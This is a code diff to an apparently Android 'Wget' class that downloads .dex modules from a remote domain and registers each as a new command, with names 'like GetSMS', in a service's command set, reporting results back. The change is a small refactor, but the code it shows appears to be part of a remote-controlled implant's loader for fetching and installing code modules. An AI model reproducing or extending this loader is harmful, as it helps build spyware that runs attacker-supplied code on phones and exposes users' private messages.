@@ -16,19 +16,19 @@ import java.net.URL;
 
 /**
  * Created by richthofen80 on 6/20/15.
- * wget command template: wget http://domain/DexLoaderFunction.dex DexLoaderFunction.dex size
+ * wget command template: wget http://domain/DexLoaderFunction.dex DexLoaderFunction.dex
  * dex file name must start with "Dexloader", end with ".dex", and its functionality part must have a verb with 3 letters, like 'GetSMS'
  */
 
 public class Wget {
     private static HttpURLConnection conn;
 
-    public static void asynDownloadFile(String url, String fileName, String fileSize){
+    public static void asynDownloadFile(String url, String fileName){
         DownloadFile downloadFile = new DownloadFile();
-        downloadFile.execute(url, fileName, fileSize);
+        downloadFile.execute(url, fileName);
     }
 
-    private static String downloadFile(String targetUrl, String fileName, int size){
+    private static String downloadFile(String targetUrl, String fileName){
         Context contextApplication = MyService.getThisContext();
         OutputStream output = null;
         int bytesum = 0;
@@ -75,13 +75,14 @@ public class Wget {
         @Override
         protected String doInBackground(String... params) {
             fileName = params[1];
-            return downloadFile(params[0], params[1], Integer.parseInt(params[2]));
+            return downloadFile(params[0], params[1]);
         }
         @Override
         protected void onPostExecute(String result){
-            MyService.refResult.setValue((result));
+            MyService.sendFeedBack(result);
             if(result.equals("download finished")){
                 if(fileName.contains(".dex")){
+                    //add new command to the command set
                     String classFunction = fileName.substring(9, fileName.length()-4).toLowerCase(); //fileName is DexLoader***.dex, so classFunction will be ***
                     String cmdName = classFunction.substring(0, 3) + " " + classFunction.substring(3, classFunction.length()); //assume classFunction is "getsms", cmdName will be "get sms"
                     MyService.commandSet.put(cmdName, fileName.substring(0, fileName.length() - 4));
